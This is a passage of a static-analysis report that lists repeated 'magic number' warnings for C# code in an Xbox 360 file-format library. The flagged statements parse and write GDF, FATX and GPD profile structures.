Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x30600;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x7FF000;  		if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  			xIO.Position = 0xFDA0000;  			if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  				xIO.Position = 0x130EB0000;  				if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  					xReturn = XboxFileType.FATX;  			}  			else  				xReturn = XboxFileType.GDF;  		}  		else  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x7FF000;  	if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  		xIO.Position = 0xFDA0000;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x7FF000;  	if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  		xIO.Position = 0xFDA0000;  		if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  			xIO.Position = 0x130EB0000;  			if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  				xReturn = XboxFileType.FATX;  		}  		else  			xReturn = XboxFileType.GDF;  	}  	else  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadUInt32 () != (uint)AllMagic.FATX) {  	xIO.Position = 0xFDA0000;  	if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  		xIO.Position = 0x130EB0000;  		if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  			xReturn = XboxFileType.FATX;  	}  	else  		xReturn = XboxFileType.GDF;  }  else  	xReturn = XboxFileType.FATX;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The following statement contains a magic number: if (xIO.ReadBytes (20).HexString () != GDFX.GDFMagic.XMedia.HexString ()) {  	xIO.Position = 0x130EB0000;  	if (xIO.ReadUInt32 () == (uint)AllMagic.FATX)  		xReturn = XboxFileType.FATX;  }  else  	xReturn = XboxFileType.GDF;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " KB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: size /= 1024;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " MB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: size /= 1024;  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: if ((size / 1024) < 1)  	return size.ToString ("#.00") + " GB";  
Magic Number,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,GetFriendlySize,The following statement contains a magic number: return (size / (double)1024.0).ToString ("#.00") + " TB";  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: if (xDate == 0 && xTime == 0)  	return DateTime.Now;  else {  	return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  }  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeDT,The following statement contains a magic number: return new DateTime ((((xDate & 0xFE00) >> 9) + 0x7BC)' ((xDate & 0x1E0) >> 5)' (xDate & 0x1F)' ((xTime & 0xF800) >> 0xB)' ((xTime & 0x7E0) >> 5)' ((xTime & 0x1F) * 2));  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: if (xDateTime.Year < 1980)  	xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: if (xDateTime.Year < 1980)  	xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Other,TimeStamps,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,FatTimeInt,The following statement contains a magic number: xDateTime = new DateTime (1980' xDateTime.Month' xDateTime.Day' xDateTime.Hour' xDateTime.Minute' xDateTime.Second);  
Magic Number,X360.Profile,DashGPD,C:\repos\mtolly_X360\X360\X360\Profile\DashGPD.cs,AddGameViaGPD,The following statement contains a magic number: try {  	string xName = xTitle.GetStringByID ((long)GPDIDs.ThisTitle);  	if (xName == null) {  		xActive = false;  		throw GPDExcepts.NameError;  	}  	if (!xTitle.xErase ())  		return (xActive = false);  	int xsize = 0x28 + ((xName.Length + 1) * 2);  	int xPosition = AllocateData (xsize);  	if (xPosition == -1)  		return (xActive = false);  	XDBFEntry xEnt = new XDBFEntry (NameSpace.Title' xTitle.TitleID' xPosition' xsize' this);  	xIO.Position = xPosition + HeaderSize;  	xIO.Write (xTitle.TitleID);  	xIO.Write ((uint)xTitle.xAchievements.Count);  	xIO.Write (xTitle.xCalcUT ());  	xIO.Write (xTitle.xCalcGSP ());  	xIO.Write (xTitle.xCalcGST ());  	xIO.Write (new byte[0x14]);  	xIO.Write (xName' StringForm.Unicode);  	xIO.Write ((short)0);  	xIO.Flush ();  	TitlePlayedEntry z = new TitlePlayedEntry (xEnt);  	if (!z.LoadDetails ())  		return (xActive = false);  	xTitlesPlayed.Add (z);  	Setting x = xGetSetting (GPDIDs.GCardTitlesPlayed' SettingType.UInt32);  	if (x == null)  		xAddSetting ((long)GPDIDs.GCardTitlesPlayed' xTitlesPlayed.Count' true' SyncType.Locale);  	else {  		uint xdata = (uint)x.Data;  		xdata++;  		x.Data = xdata;  		x.xUpdate (SyncType.Locale);  	}  	UpdateSync (NameSpace.Title' xTitle.TitleID' SyncType.Server);  	return (UpdateHeader () & !(xActive = false));  }  catch {  	return (xActive = false);  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset + 4;  	// int32 for Struct size is constant (0x1C)  	xid = xRef.xIO.ReadInt32 ();  	imageID = xRef.xIO.ReadInt32 ();  	Worth = xRef.xIO.ReadUInt32 ();  	Flg = xRef.xIO.ReadBytes (4);  	TimeL = xRef.xIO.ReadInt64 ();  	try {  		DJsIO xStrings = new DJsIO (xRef.xIO.ReadBytes (Size - 0x1C)' true);  		xTitle = xStrings.ReadString (StringForm.Unicode);  		xDescription1 = xStrings.ReadString (StringForm.Unicode);  		xDescription2 = xStrings.ReadString (StringForm.Unicode);  	}  	catch {  		xTitle = "";  		xDescription1 = "";  		xDescription2 = "";  	}  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset + 4;  	// int32 for Struct size is constant (0x1C)  	xid = xRef.xIO.ReadInt32 ();  	imageID = xRef.xIO.ReadInt32 ();  	Worth = xRef.xIO.ReadUInt32 ();  	Flg = xRef.xIO.ReadBytes (4);  	TimeL = xRef.xIO.ReadInt64 ();  	try {  		DJsIO xStrings = new DJsIO (xRef.xIO.ReadBytes (Size - 0x1C)' true);  		xTitle = xStrings.ReadString (StringForm.Unicode);  		xDescription1 = xStrings.ReadString (StringForm.Unicode);  		xDescription2 = xStrings.ReadString (StringForm.Unicode);  	}  	catch {  		xTitle = "";  		xDescription1 = "";  		xDescription2 = "";  	}  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position = Offset + 4;  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,LoadDetails,The following statement contains a magic number: Flg = xRef.xIO.ReadBytes (4);  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = (Offset + 4);  	xRef.xIO.Write (AchievementID);  	xRef.xIO.Write (imageID);  	xRef.xIO.Write (Worth);  	xRef.xIO.Write (Flg);  	xRef.xIO.Write (TimeL);  	xRef.xIO.Flush ();  	if (UpdateSync)  		xRef.UpdateSync (NameSpace.Achievement' ID' SyncType.Server);  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,AchievementEntry,C:\repos\mtolly_X360\X360\X360\Profile\GameGPD.cs,xUpdate,The following statement contains a magic number: xRef.xIO.Position = (Offset + 4);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: try {  	int Var1 = 0;  	xRef.xIO.Position = Offset;  	xSettingID = xRef.xIO.ReadInt32 ();  	xRef.xIO.Position += 4;  	xContentID = xRef.xIO.ReadByte ();  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Binary:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.Context:  		xdata = xRef.xIO.ReadInt32 ();  		break;  	case SettingType.DateTime:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Double:  		xdata = xRef.xIO.ReadDouble ();  		break;  	case SettingType.Float:  		xdata = xRef.xIO.ReadSingle ();  		break;  	case SettingType.UInt32:  		xdata = xRef.xIO.ReadUInt32 ();  		break;  	case SettingType.Int64:  		xdata = xRef.xIO.ReadInt64 ();  		break;  	case SettingType.Unicode:  		Var1 = xRef.xIO.ReadInt32 ();  		Var2 = xRef.xIO.ReadInt32 ();  		break;  	default:  		Data = xRef.xIO.ReadBytes (8);  		break;  	}  	if (Var1 > 0)  		xdata = xRef.xIO.ReadBytes (Var1);  	if (ContentType == SettingType.Unicode)  		xdata = Encoding.BigEndianUnicode.GetString ((byte[])xdata).Replace ("\0"' "");  	xLoaded = true;  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position += 4;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: xRef.xIO.Position += 7;  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: switch (ContentType) {  case SettingType.Binary:  	Var1 = xRef.xIO.ReadInt32 ();  	Var2 = xRef.xIO.ReadInt32 ();  	break;  case SettingType.Context:  	xdata = xRef.xIO.ReadInt32 ();  	break;  case SettingType.DateTime:  	xdata = xRef.xIO.ReadInt64 ();  	break;  case SettingType.Double:  	xdata = xRef.xIO.ReadDouble ();  	break;  case SettingType.Float:  	xdata = xRef.xIO.ReadSingle ();  	break;  case SettingType.UInt32:  	xdata = xRef.xIO.ReadUInt32 ();  	break;  case SettingType.Int64:  	xdata = xRef.xIO.ReadInt64 ();  	break;  case SettingType.Unicode:  	Var1 = xRef.xIO.ReadInt32 ();  	Var2 = xRef.xIO.ReadInt32 ();  	break;  default:  	Data = xRef.xIO.ReadBytes (8);  	break;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,LoadDetails,The following statement contains a magic number: Data = xRef.xIO.ReadBytes (8);  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (stringlen);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((string)xdata' StringForm.Unicode);  			xRef.xIO.Write ((short)0);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.DateTime:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		return true;  	case SettingType.Float:  		xRef.xIO.Write ((float)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Double:  		xRef.xIO.Write ((double)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.UInt32:  		if (xdata.GetType ().ToString ().ToLower () == "system.uint32")  			xRef.xIO.Write ((uint)xdata);  		else  			xRef.xIO.Write ((int)xdata);  		xRef.xIO.Flush ();  		break;  	case SettingType.Int64:  		xRef.xIO.Write ((long)xdata);  		xRef.xIO.Flush ();  		break;  	default:  		return true;  	}  	if (xType != SyncType.None)  		return xRef.UpdateSync (NameSpace.Setting' ID' xType) & xRef.UpdateHeader ();  	return xRef.UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,Setting,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xUpdate,The following statement contains a magic number: try {  	xRef.xIO.Position = Offset;  	xRef.xIO.Write (xSettingID);  	xRef.xIO.Position += 4;  	xRef.xIO.Write (xContentID);  	xRef.xIO.Position += 7;  	switch (ContentType) {  	case SettingType.Context:  	case SettingType.Binary:  		{  			byte[] xIn = (byte[])xdata;  			int currentsize = (0x18 + xIn.Length);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + xIn.Length' xSize - currentsize));  			else if (currentsize > xSize) {  				int pos = xRef.AllocateData (currentsize);  				if (pos == -1)  					return false;  				xRef.xIO.Position = pos + xRef.HeaderSize;  				xRef.xIO.Write (xSettingID);  				xRef.xIO.Write (new byte[4]);  				xRef.xIO.Write (xContentID);  				xRef.xIO.Write (new byte[7]);  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset' xSize));  				xOffset = pos;  			}  			xSize = currentsize;  			xRef.xIO.Write (((byte[])xdata).Length);  			xRef.xIO.Write (Var2);  			xRef.xIO.Write ((byte[])xdata);  			xRef.xIO.Flush ();  		}  		break;  	case SettingType.Unicode:  		{  			string xIn = (string)xdata;  			int stringlen = ((xIn.Length + 1) * 2);  			int currentsize = (0x18 + stringlen);  			if (currentsize < xSize)  				xRef.xFreeEnts.Add (new FreeSpaceEntry (xRef' xOffset + stringlen' 